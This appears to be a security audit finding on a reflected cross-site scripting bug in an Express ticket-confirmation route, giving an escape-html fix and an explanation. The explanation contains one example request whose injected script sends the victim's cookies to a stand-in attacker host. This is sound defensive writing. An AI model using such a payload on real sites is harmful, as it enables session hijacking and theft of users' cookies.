## Verdict

Confirmed. Reflected cross-site scripting: request data is concatenated into an HTML string and sent to the client without any output encoding.

## Source

- `req.query.note` (line 17, via `closingNote`) - a fully attacker-controlled query string parameter, reflected verbatim into the response body.
- `req.params.id` (line 22) - a route parameter, also reflected without encoding. Its exploitability is narrower here because the handler only reaches the render step when `req.params.id` matches an existing key in the `tickets` object (line 10-13), but it is still user-supplied data placed into HTML without encoding and should be treated the same way for defense in depth (e.g. if ticket IDs are ever generated from less-constrained input, or the lookup logic changes).

## Fix

```javascript
const express = require('express');
const escapeHtml = require('escape-html');
const app = express();

// In-memory store of support tickets, keyed by id.
const tickets = {
    'T-1001': { subject: 'Printer will not turn on', status: 'Open' }
};

app.get('/tickets/:id/confirmation', (req, res) => {
    const ticket = tickets[req.params.id];
    if (!ticket) {
        return res.status(404).send('Ticket not found');
    }

    // Agents can append a short note when closing a ticket; it arrives as a
    // query parameter from the "close ticket" form and is never persisted.
    const closingNote = req.query.note || '';

    const page = `
        <html>
            <body>
                <h1>Ticket ${escapeHtml(req.params.id)} - ${escapeHtml(ticket.subject)}</h1>
                <p>Status: ${escapeHtml(ticket.status)}</p>
                <p>Agent note: ${escapeHtml(closingNote)}</p>
            </body>
        </html>
    `;

    res.send(page);
});

module.exports = app;
```

`escape-html` is a small, widely used dependency (also the encoder Express itself uses internally) that converts `&`, `<`, `>`, `"`, and `'` into their HTML entity equivalents. Applying it to every value interpolated into the template - not just `closingNote` - closes both the confirmed sink and the narrower `req.params.id`/`ticket.subject` paths in one pass, so the fix does not need to be revisited if the ticket lookup logic changes later.

If a templating engine is already part of the stack (EJS, Pug, Handlebars), rendering this view through it with its default auto-escaping output (`<%= %>` in EJS, `#{}` in Pug) is an equally valid and often preferable fix, since it removes the risk of a future edit reintroducing an unescaped `${}` interpolation into the same template.

## Explanation

The handler builds an HTML document with a JavaScript template literal and hands it directly to `res.send()`. Template literals perform no HTML encoding - `${closingNote}` and `${req.params.id}` are substituted as raw text. Because `note` is read straight from the query string with no validation or encoding, a request such as `/tickets/T-1001/confirmation?note=<script>document.location='https://evil.example/steal?c='+document.cookie</script>` causes the browser to parse and execute the injected `<script>` tag in the context of the application's origin, giving an attacker the ability to run arbitrary JavaScript in the victim's session - steal cookies, perform actions as the logged-in agent, or deface the page.

The fix keeps the same string-templating approach but HTML-encodes every value before it is placed inside the markup, so `<`, `>`, `&`, `"`, and `'` are rendered as inert text (e.g. `&lt;script&gt;`) rather than being parsed as markup or script by the browser. This preserves the existing response format and content type while eliminating the ability for request data to break out of the surrounding HTML context.
